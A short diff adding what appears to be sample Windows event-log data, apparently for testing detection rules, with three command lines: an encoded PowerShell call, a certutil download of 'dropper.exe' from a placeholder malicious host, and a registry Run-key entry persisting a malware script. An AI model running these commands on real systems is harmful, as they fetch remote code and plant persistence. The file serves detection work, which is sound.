@@ -1,0 +1,8 @@
+EventID: 1
+CommandLine: powershell.exe -enc aGVsbG8gd29ybGQ=
+
+EventID: 1
+CommandLine: certutil -urlcache -f http://malicious.site/dropper.exe
+
+EventID: 13
+CommandLine: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v EvilScript /d "C:\malware\runme.bat"
